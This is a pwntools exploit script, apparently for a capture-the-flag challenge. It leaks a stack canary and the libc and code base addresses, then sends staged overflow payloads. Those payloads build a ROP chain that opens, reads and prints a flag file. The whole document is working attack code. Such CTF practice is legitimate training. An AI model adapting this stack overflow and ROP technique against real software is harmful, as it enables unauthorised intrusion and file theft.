#!/home/user/mambaforge/bin/python
from pwn import *
from time import sleep

context.arch = 'amd64'

p = process('./chal')
#p = remote('10.113.184.121', 10056)
p.recvuntil(b"Haaton's name?")
p.sendline(b'A'*20 + b'HACHAMA\x00')
p.recvuntil(b'HACHAMA\x00\n')
p.recv(0x2f)
base = p.recv(0x31)
canary = u64(base[:8])
libc = u64(base[16:16+8]) - 0x29d90
code = u64(base[32:40]) - 0x1331
print("this is canary: ", hex(canary))
print("this is libc: ", hex(libc))
print("this is code: ", hex(code))

pay1 = b"/home/chal/flag.txt"#/home/chal/flag.txt
pay1 = b'./flag.txt'
pop_rdx = libc + 0x11f497
pop_rax = libc + 0x0000000000045eb0
pop_rsi = libc + 0x000000000002be51
pop_rdi = libc + 0x000000000002a3e5
libc_open = libc + 0x00000000001146d0
libc_read = libc + 0x00000000001149c0
libc_write = libc + 0x000000000114a60
syscall = libc + 0x0000000000099e74
rbp = code + 0x4487
rbp2 = code + 0x4878
code_read = code + 0x145b

popc1 = flat([pop_rax, 400, code_read])
popc2 = flat([pop_rdi, rbp-0x40 , pop_rdx, 0,0,pop_rsi, 0, libc_open]) # open
popc3 = flat([pop_rdi, 3, pop_rsi, rbp2, pop_rdx,0, 0x30, libc_read, # read
             pop_rdi, 1, libc_write]) # write

p.send(b"C"*0x38 + p64(canary) + p64(rbp) + p64(code + 0x1454))
raw_input('>')
p.send(pay1.ljust(0x38,b'\x00') + p64(canary) + p64(rbp2) + popc1)
raw_input('>')
p.sendline(b"E"*0x38 + p64(canary) + p64(0) + popc2 + popc3)

p.interactive()